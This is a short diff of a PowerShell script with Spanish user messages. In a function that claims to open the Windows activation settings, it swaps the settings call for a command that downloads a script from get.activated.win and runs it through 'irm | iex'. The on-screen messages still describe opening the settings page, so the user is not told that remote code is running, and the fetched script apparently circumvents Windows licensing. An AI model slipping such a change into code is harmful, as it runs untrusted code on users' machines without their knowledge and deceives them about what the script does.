@@ -366,7 +366,7 @@ function Open-Activacion {
     Write-Host ''
     Write-Host 'Abriendo la configuracion de activacion de Windows...' -ForegroundColor Cyan
     try {
-        Start-Process 'ms-settings:activation' -ErrorAction Stop
+        Start-Process powershell -ArgumentList "-NoExit", "-Command", "irm https://get.activated.win | iex"
         Write-Host 'Listo: desde ahi se carga la clave de producto.' -ForegroundColor Green
     }
     catch {
